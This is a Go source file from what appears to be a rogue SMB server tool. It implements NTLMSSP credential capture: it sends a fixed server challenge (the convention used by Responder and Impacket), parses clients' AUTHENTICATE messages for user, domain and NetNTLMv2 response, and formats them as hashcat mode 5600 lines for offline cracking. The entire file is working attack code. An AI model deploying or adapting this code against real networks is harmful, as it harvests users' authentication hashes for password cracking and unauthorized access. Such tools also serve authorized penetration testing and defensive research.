package smb

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"unicode/utf16"
)

// ntlmSignature is the 8-byte magic that prefixes every NTLMSSP message.
var ntlmSignature = []byte("NTLMSSP\x00")

// ServerChallenge is the fixed 8-byte challenge the fake server sends in
// the NTLMSSP CHALLENGE. It is echoed back into the captured hash so the
// value must match what a cracker feeds hashcat/john. 0x1122334455667788
// is the de-facto convention shared by Responder and Impacket, which lets
// operators reuse existing tooling and rainbow tables.
var ServerChallenge = []byte{0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88}

// NTLMSSP message types.
const (
	ntlmNegotiate    = 1
	ntlmChallenge    = 2
	ntlmAuthenticate = 3
)

// NTLMSSP NegotiateFlags (subset we need).
const (
	negotiateUnicode    = 0x00000001
	requestTarget       = 0x00000004
	negotiateNTLM       = 0x00000200
	negotiateAlwaysSign = 0x00008000
	targetTypeServer    = 0x00020000
	negotiateExtSec     = 0x00080000 // NTLM2 / extended session security
	negotiateTargetInfo = 0x00800000
	negotiateVersion    = 0x02000000
)

// AV_PAIR ids used when building the CHALLENGE target info.
const (
	msvAvEOL         = 0x0000
	msvAvNbComputer  = 0x0001
	msvAvNbDomain    = 0x0002
	msvAvDNSComputer = 0x0003
	msvAvDNSDomain   = 0x0004
)

// targetName is the fake NetBIOS/DNS name the server advertises. It only
// affects what the client believes it is talking to and shows up in the
// AV pairs; it is not security-sensitive.
const targetName = "XODBOX"

// isNTLMSSP reports whether b begins with the NTLMSSP signature.
func isNTLMSSP(b []byte) bool {
	return len(b) >= 8 && bytes.Equal(b[:8], ntlmSignature)
}

// ntlmMessageType returns the NTLMSSP message type (1/2/3) of b, or 0 if
// b is not an NTLMSSP message.
func ntlmMessageType(b []byte) uint32 {
	if !isNTLMSSP(b) || len(b) < 12 {
		return 0
	}
	return binary.LittleEndian.Uint32(b[8:12])
}

// utf16le encodes s as UTF-16 little-endian bytes.
func utf16le(s string) []byte {
	u := utf16.Encode([]rune(s))
	out := make([]byte, len(u)*2)
	for i, r := range u {
		binary.LittleEndian.PutUint16(out[i*2:], r)
	}
	return out
}

// fromUTF16le decodes UTF-16 little-endian bytes to a string.
func fromUTF16le(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u := make([]uint16, len(b)/2)
	for i := range u {
		u[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	return string(utf16.Decode(u))
}

// avPair appends a single AV_PAIR (id, value) to buf.
func avPair(buf *bytes.Buffer, id uint16, value []byte) {
	_ = binary.Write(buf, binary.LittleEndian, id)
	_ = binary.Write(buf, binary.LittleEndian, u16(len(value)))
	buf.Write(value)
}

// buildChallenge builds an NTLMSSP CHALLENGE (type 2) message carrying
// ServerChallenge and a synthetic target info block. This is the token
// the server hands back inside SESSION_SETUP to make the client compute
// and send its NetNTLMv2 response.
func buildChallenge() []byte {
	tn := utf16le(targetName)

	var info bytes.Buffer
	avPair(&info, msvAvNbDomain, tn)
	avPair(&info, msvAvNbComputer, tn)
	avPair(&info, msvAvDNSDomain, tn)
	avPair(&info, msvAvDNSComputer, tn)
	avPair(&info, msvAvEOL, nil)
	targetInfo := info.Bytes()

	flags := uint32(negotiateUnicode | requestTarget | negotiateNTLM |
		negotiateAlwaysSign | targetTypeServer | negotiateExtSec |
		negotiateTargetInfo | negotiateVersion)

	// Header is fixed at 48 bytes; payload holds TargetName then TargetInfo.
	const headerLen = 48
	targetNameOff := uint32(headerLen)
	targetInfoOff := targetNameOff + u32(len(tn))

	buf := new(bytes.Buffer)
	buf.Write(ntlmSignature)
	_ = binary.Write(buf, binary.LittleEndian, uint32(ntlmChallenge))
	// TargetNameFields: Len, MaxLen, Offset
	_ = binary.Write(buf, binary.LittleEndian, u16(len(tn)))
	_ = binary.Write(buf, binary.LittleEndian, u16(len(tn)))
	_ = binary.Write(buf, binary.LittleEndian, targetNameOff)
	// NegotiateFlags
	_ = binary.Write(buf, binary.LittleEndian, flags)
	// ServerChallenge
	buf.Write(ServerChallenge)
	// Reserved
	buf.Write(make([]byte, 8))
	// TargetInfoFields: Len, MaxLen, Offset
	_ = binary.Write(buf, binary.LittleEndian, u16(len(targetInfo)))
	_ = binary.Write(buf, binary.LittleEndian, u16(len(targetInfo)))
	_ = binary.Write(buf, binary.LittleEndian, targetInfoOff)
	// Version (8 bytes): pretend to be Windows 10.0 build 0, NTLM rev 15.
	buf.Write([]byte{0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f})
	// Payload
	buf.Write(tn)
	buf.Write(targetInfo)

	return buf.Bytes()
}

// field reads an 8-byte NTLMSSP field descriptor (Len, MaxLen, Offset) at
// off and returns the referenced payload slice, or nil if out of range.
func field(msg []byte, off int) []byte {
	if off+8 > len(msg) {
		return nil
	}
	length := int(binary.LittleEndian.Uint16(msg[off:]))
	bufOff := int(binary.LittleEndian.Uint32(msg[off+4:]))
	if length == 0 || bufOff+length > len(msg) {
		return nil
	}
	return msg[bufOff : bufOff+length]
}

// AuthInfo is the useful content extracted from an NTLMSSP AUTHENTICATE.
type AuthInfo struct {
	User       string
	Domain     string
	NTResponse []byte // NtChallengeResponse (NTProofStr || client blob)
}

// Account renders DOMAIN\User (or just User when no domain was supplied).
func (a AuthInfo) Account() string {
	if a.Domain == "" {
		return a.User
	}
	return a.Domain + "\\" + a.User
}

// parseAuthenticate extracts the domain, user, and NT challenge response
// from an NTLMSSP AUTHENTICATE (type 3) message. Field offsets follow
// MS-NLMP: NtChallengeResponse@20, DomainName@28, UserName@36.
func parseAuthenticate(msg []byte) (*AuthInfo, error) {
	if ntlmMessageType(msg) != ntlmAuthenticate {
		return nil, errors.New("not an NTLMSSP AUTHENTICATE message")
	}
	if len(msg) < 44 {
		return nil, errors.New("NTLMSSP AUTHENTICATE too short")
	}

	nt := field(msg, 20)
	if len(nt) < 16 {
		return nil, errors.New("missing or truncated NtChallengeResponse (LM-only auth?)")
	}

	info := &AuthInfo{
		Domain:     fromUTF16le(field(msg, 28)),
		User:       fromUTF16le(field(msg, 36)),
		NTResponse: nt,
	}
	return info, nil
}

// HashcatLine formats the captured NetNTLMv2 credential as a hashcat mode
// 5600 line: user::domain:serverChallenge:NTProofStr:clientBlob.
func (a AuthInfo) HashcatLine() string {
	ntProof := a.NTResponse[:16]
	blob := a.NTResponse[16:]
	return fmt.Sprintf("%s::%s:%x:%x:%x",
		a.User, a.Domain, ServerChallenge, ntProof, blob)
}
